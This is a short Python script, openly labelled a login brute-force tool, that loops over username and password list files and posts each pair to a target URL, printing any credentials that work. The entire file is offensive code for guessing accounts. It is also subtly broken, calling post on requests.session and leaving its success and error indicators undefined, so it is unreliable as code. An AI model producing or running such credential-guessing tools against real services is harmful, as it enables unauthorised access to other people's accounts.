#!/usr/bin/env python3
"""
Simple login brute force script.
"""
import requests
import sys


def attempt_login(url, username, password):
    try:
        response = requests.session.post(
            url,
            data={"username": username, "password": password},
            timeout=5,  # Prevent hanging on failed attempts
        )

        if success_indicator in response.text:  # type: ignore # Adjust based on application behavior
            print(f"[SUCCESS] Found valid credentials: {username}:{password}")
        elif error_indicator in response.text:  # type: ignore
            pass  # Expected errors like "invalid password"
    except Exception as e:
        print(f"Error testing credentials {username}:{password}: {e}")


def main():
    if len(sys.argv) != 4:
        print(
            "Usage: python3 brute_force.py <target_url> <userlist_file> <passlist_file>"
        )
        sys.exit(1)

    url = sys.argv[1]
    username_file = sys.argv[2]
    password_file = sys.argv[3]
    # Load credentials
    usernames = [line.strip() for line in open(username_file) if line.strip()]
    passwords = [line.strip() for line in open(password_file) if line.strip()]
    session = requests.Session()
    # Check each username with each password
    for username in usernames:
        print(f"Testing: {username}")
        for password in passwords:
            attempt_login(url, username, password)


if __name__ == "__main__":
    main()
